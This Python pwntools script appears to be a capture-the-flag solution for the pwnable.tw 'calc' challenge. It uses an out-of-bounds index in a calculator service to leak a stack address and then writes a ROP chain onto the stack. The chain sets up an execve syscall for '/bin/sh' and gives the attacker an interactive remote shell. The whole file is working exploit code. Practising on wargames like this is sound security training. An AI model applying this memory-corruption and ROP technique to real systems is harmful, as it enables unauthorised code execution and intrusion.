#!/usr/bin/env python
#   Version 
#   Author: WildfootW
#   GitHub: github.com/Wildfoot
#   Copyright (C) 2018 WildfootW All rights reserved.
#

from pwn import *

context.update(arch="i386", os="linux")

host = "127.0.0.1"
port = 8888
host = "chall.pwnable.tw"
port = 10100
r = remote(host, port)

input("attach in gdb and press Enter")

def show_address_value(array_index):
    payload = "+" + str(array_index)
    print("payload =", payload)
    r.sendline(payload)
    return int(r.recvuntil("\n"))

def modify_address_value(array_index, value):
    # 2's-complement
    if value > 2147483647:
        value = value - (1 << 32)

    value_now = show_address_value(array_index)
    payload = "+" + str(array_index)
    if value - value_now >= 0:
        payload += ("+" + str(value - value_now))
    else:
        payload += str(value - value_now)
    print("payload =", payload)
    r.sendline(payload)
    r.recvuntil("\n")

    # check the value
    payload = "+" + str(array_index)
    r.sendline(payload)
    modified_value = int(r.recvuntil("\n"))
    # 2's-complement
    if modified_value < 0:
        modified_value += (1 << 32)
    print(array_index, "=", p32(modified_value))

pop_eax_ret = 0x0805c34b
pop_edx_ecx_ebx = 0x080701d0
syscall = 0x08049a21

r.recvuntil("\n")
old_ebp = show_address_value(360)
saved_ret_adr_adr = old_ebp + 0xcbcc - 0xcbe8
string_address = saved_ret_adr_adr + (7 * 4)
modify_address_value(361, pop_edx_ecx_ebx)
modify_address_value(362, 0)
modify_address_value(363, 0)
modify_address_value(364, string_address)
modify_address_value(365, pop_eax_ret)
modify_address_value(366, 11)
modify_address_value(367, syscall)
modify_address_value(368, u32(b"/bin"))
modify_address_value(369, u32(b"/sh\x00"))

r.interactive()

